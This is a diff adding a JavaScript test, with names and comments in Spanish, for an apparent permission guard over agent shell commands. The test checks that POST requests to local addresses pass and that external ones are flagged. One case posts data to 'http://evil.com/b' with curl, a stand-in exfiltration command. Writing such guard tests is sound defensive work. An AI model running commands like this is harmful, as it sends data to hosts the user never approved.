@@ -45,6 +45,13 @@ test('el guardia: tabla de casos en los cinco modos de permiso', () => {
   }
 });
 
+test('enviar datos a tu propio PC (probar una API local) no pregunta; a otra dirección, sí', () => {
+  assert.equal(riskOf(`$base='http://localhost:3000'; Invoke-RestMethod -Method Post -Uri "$base/api/notes" -Body '{}'`), null);
+  assert.equal(riskOf('curl -X POST http://127.0.0.1:8080/api -d x=1'), null);
+  assert.ok(riskOf('curl -X POST https://example.com/api -d x=1'));
+  assert.ok(riskOf('curl -X POST http://localhost:3000/a http://evil.com/b -d x'), 'si alguna dirección no es local, pregunta');
+});
+
 test('el guardia reconoce las herramientas de cada agente', () => {
   assert.equal(toolClass('Read'), 'read');
   assert.equal(toolClass('MultiEdit'), 'edit');
